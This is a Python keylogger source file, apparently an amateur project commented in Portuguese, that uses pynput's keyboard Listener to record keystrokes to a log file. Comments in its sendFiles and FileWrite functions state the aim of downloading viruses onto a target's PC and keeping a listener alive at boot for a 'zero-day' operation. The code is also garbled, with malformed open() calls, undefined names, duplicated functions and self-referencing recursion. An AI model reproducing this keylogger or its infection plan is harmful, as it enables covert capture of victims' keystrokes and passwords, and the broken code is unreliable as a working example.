#!/usr/bin/env python3
"""keylogger_black_genesis - Keylogger/FileReader & Input Capture (Keyboard) - V1.0.0 """

def inputKeys(keyboard):
    '''
    Esta Função será responsável por receber a resposta do teclado 
    via Listener e escrever no arquivo de log
    '''
    
    #converter a resposta do teclado para string
    keyboardresponse = str(answer)
    
    #abrir o arquivo de log no modo readonly
    with open("logFile, rdonly") as f:
        f.write(keyboardresponse)

#em pynput, importar o método Listener do teclado
from pynput.keyboard import Listener

#definir a localização do arquivo de log
logFile = "/home/diegorego/keylogger_black_genesis/log.txt"

def writeLog(key):
    '''
    Esta função será responsável por receber a tecla pressionada
    via Listener e escrever no arquivo de log
    '''

    #converter a tecla pressionada para string
    keydata = str(key)

    #abrir o arquivo de log no modo append
    with open("logFile, a") as f:
        f.write(keydata)

def FileWrite():

#baixar Arquivos, coisas, virus de computador para PC do alvo, abrir um listener e infectar o computador pessoal do alvo
#na hora em que o alvo liga seu PC e inicializa o sistema operacional, o listener estará online e pronto para a operação Explorar do Dia Zero
    with FileWrite(on_listener=sendFiles) as fw:
        fw.send()

def keydata():
    keydata = keydata.replace("'", "")

translate_keys = {
     "Key.space": " ",
     "Key.shift_r": "",
     "Key.shift_l": "",
     "Key.enter": "\n",
     "Key.alt": "",
     "Key.esc": "",
     "Key.cmd": "",
     "Key.caps_lock": "",
}

for key in translate_keys:
    #key recebe a chave do dicionário translate_keys
    #substituir a chave (key) pelo seu valor (translate_keys[key])
    keydata

#em pynput, importar o método Listener do teclado
logFile = "/home/diegorego/keylogger_black_genesis/log.txt"

def writeLog(key):
    '''
    Esta função será responsável por receber a tecla personalizada
    via Listener e escrever no arquivo de log
    '''

    #dicionário com as teclas a serem traduzidas
    translate_keys = {
         "Key.space": " ",
	 "Key.shift_r": "",
	 "Key.shift_l": "",
	 "Key.enter": "\n",
	 "Key.alt": "",
	 "Key.esc": "",
	 "Key.cmd": "",
 	 "Key.caps_lock": "",
}

#converter a tecla pressionada para string
keydata = str(key)

#remover as aspas simples que limitam os caracteres
keydata = keydata.replace("'", "")

for key in translate_keys:
    #key recebe a chave do dicionário translate_keys
    #substituir a chave (key) pelo seu valor (translate_keys[key])
    keydata = keydata.replace(key, translate_keys[key])

def File():

#abrir o arquivo de log no modo append
    with open(File) as f:
        f.write(keydata)

def log():

#abrir o Listener do teclado e escutar o evento on_press
#quando o evento on_press ocorrer, chamar a função writeLog
    with Listener(on_press=writeLog) as l:
        l.join(log)

def sendFiles():

#baixar Arquivos, coisas, virus de computador para PC do alvo, abrir um listener e infectar o computador pessoal do alvo
#na hora em que o alvo liga seu PC e inicializa o sistema operacional, o listener estará online e pronto para a operação Explorar do Dia Zero
    with FileWrite(on_listener=sendFiles) as fw:
        fw.send(files)
